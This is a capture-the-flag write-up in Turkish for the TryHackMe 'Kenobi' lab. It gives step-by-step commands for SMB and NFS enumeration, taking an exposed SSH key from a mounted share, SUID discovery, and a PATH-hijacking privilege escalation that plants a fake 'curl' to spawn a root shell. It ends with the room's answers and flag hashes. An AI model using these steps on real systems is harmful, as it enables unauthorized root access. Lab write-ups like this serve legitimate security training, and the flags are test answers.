# TryHackMe - Kenobi Writeup

# Reconnaissance

İlk olarak hedef makine üzerinde tam port taraması gerçekleştiriyoruz.

```bash
nmap -sS -sC -sV -p- 10.113.156.213
```
<img width="1053" height="742" alt="nmap1" src="https://github.com/user-attachments/assets/22e967f7-6618-471e-a90f-46ecb18d9c9d" />

```bash
nmap -vvv 10.113.156.213
```

## Soru

> Makinede kaç port açık?

**Cevap:** `7`

---

# SMB Enumeration

SMB paylaşımlarını listelemek için:

```bash
smbclient -L //10.113.156.213/ -N
```

<img width="1010" height="154" alt="smb1" src="https://github.com/user-attachments/assets/fe3a977d-5294-4f0d-95d7-0eabc2104ea9" />

Bulunan paylaşımlar:

- print$
- anonymous
- IPC$

## Soru

> Kaç paylaşım bulundu?

**Cevap:** `3`

---

## Anonymous Share

Anonymous paylaşımına bağlanıyoruz.

```bash
smbclient //10.113.156.213/anonymous -N
```
<img width="854" height="210" alt="smb2" src="https://github.com/user-attachments/assets/9f373a11-c02c-4756-9ff7-83fd089b7027" />

Dosyaları listeliyoruz.

```bash
ls
```

Karşımıza:

```
log.txt
```

çıkıyor.

Dosyayı indiriyoruz.

```bash
get log.txt
```

SMB shell'den çıkıp Kali üzerinde dosyayı inceliyoruz.

```bash
cat log.txt
```

Log dosyasında önemli bilgiler bulunuyor.

- Kullanıcı adı: **kenobi**
- FTP servisinin **ProFTPD 1.3.5** kullandığı görülüyor.

---

## Sorular

**Bağlantı kurulduktan sonra hangi dosya görülüyor?**

```
log.txt
```

**FTP hangi portta çalışıyor?**

```
21
```

**ProFTPD sürümü nedir?**

```
1.3.5
```

---

# NFS Enumeration

İlk nmap çıktısında aşağıdaki servisleri görüyoruz.

```
111 rpcbind
2049 nfs
mountd
```

Bu nedenle NFS exportlarını kontrol ediyoruz.

```bash
showmount -e 10.113.156.213
```

<img width="474" height="68" alt="showmount" src="https://github.com/user-attachments/assets/2dfba21e-6464-4109-bd7b-d3ecc6869a1d" />

Çıktı:

```
/var *
```

## Soru

> What mount can we see?

**Cevap**

```
/var
```

---

# Mount NFS Share

Paylaşımı kendi sistemimize mount ediyoruz.

```bash
mkdir -p /mnt/kenobi

sudo mount -t nfs 10.113.156.213:/var /mnt/kenobi
```

Ardından içerikleri inceliyoruz.

```bash
ls -la /mnt/kenobi
```

ve özellikle:

```bash
ls -la /mnt/kenobi/tmp
```
<img width="922" height="506" alt="idrsakadar" src="https://github.com/user-attachments/assets/c8d4e84f-5ea7-4791-9d40-74a90769f2f4" />

Burada dikkat çeken dosya:

```
id_rsa
```

SSH private key'i Kali makinemize kopyalıyoruz.

```bash
cp /mnt/kenobi/tmp/id_rsa .
chmod 600 id_rsa
```

SSH ile giriş yapıyoruz.

```bash
ssh -i id_rsa kenobi@10.113.156.213
```

> SSH bağlantısı kurarken private key'in doğru path'i verilmelidir.

---

# User Flag

Bağlandıktan sonra kullanıcı dizinine gidiyoruz.

```bash
cd ~
cat user.txt
```

```
d0b0f3f53b6caa532a83915e19224899
```
<img width="408" height="93" alt="flag1" src="https://github.com/user-attachments/assets/3311cd53-34be-4b0c-a953-7fe67025b8dc" />

---

# Searchsploit

Log dosyasından öğrendiğimiz ProFTPD sürümünü araştırıyoruz.

```bash
searchsploit ProFTPD 1.3.5
```
<img width="1141" height="169" alt="proftpd" src="https://github.com/user-attachments/assets/d0ed2f5e-69aa-479d-be29-4beb80cf0612" />

## Soru

> ProFTPD'nin çalıştırılmasında kaç güvenlik açığı bulunuyor?

**Cevap**

```
4
```

---

# Privilege Escalation Enumeration

SUID binarylerini listeliyoruz.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Dikkat çeken dosya:

```
/usr/bin/menu
```

## Soru

> Hangi dosya olağan dışı görünüyor?

**Cevap**

```
/usr/bin/menu
```

Programı çalıştırıyoruz.

```bash
/usr/bin/menu
```

```
1. status check
2. kernel version
3. ifconfig
```

## Soru

> Kaç seçenek bulunuyor?

**Cevap**

```
3
```

---

# PATH Hijacking

Binary'nin kullandığı komutları inceliyoruz.

```bash
strings /usr/bin/menu
```

Çıktıda:

```
curl
uname
ifconfig
```

komutlarının tam path kullanılmadan çağrıldığı görülüyor.

Bu nedenle **PATH Hijacking** zafiyetinden yararlanıyoruz.

Geçici dizinde sahte bir `curl` oluşturuyoruz.

```bash
cd /tmp

cat > curl << EOF
#!/bin/bash
/bin/bash -p
EOF

chmod +x curl
```

PATH değişkenini güncelliyoruz.

```bash
export PATH=/tmp:$PATH
```

Kontrol ediyoruz.

```bash
which curl
```

```
/tmp/curl
```

Artık menüyü tekrar çalıştırıyoruz.

```bash
/usr/bin/menu
```

ve

```
1
```

seçeneğini giriyoruz.

Program root yetkisiyle bizim hazırladığımız `curl` dosyasını çalıştırdığı için root shell elde ediyoruz.

---
<img width="1023" height="541" alt="privesc" src="https://github.com/user-attachments/assets/848ea956-db47-46ac-bfbf-8559a5e6b9ec" />

# Root Flag

```bash
cd /root

cat root.txt
```

```
177b3cd8562289f37382721c28381f02
```
<img width="469" height="154" alt="flagroot" src="https://github.com/user-attachments/assets/35f48164-c15f-4709-affe-0b7210d3135d" />

---

# Flags

## User

```
d0b0f3f53b6caa532a83915e19224899
```

## Root

```
177b3cd8562289f37382721c28381f02
```
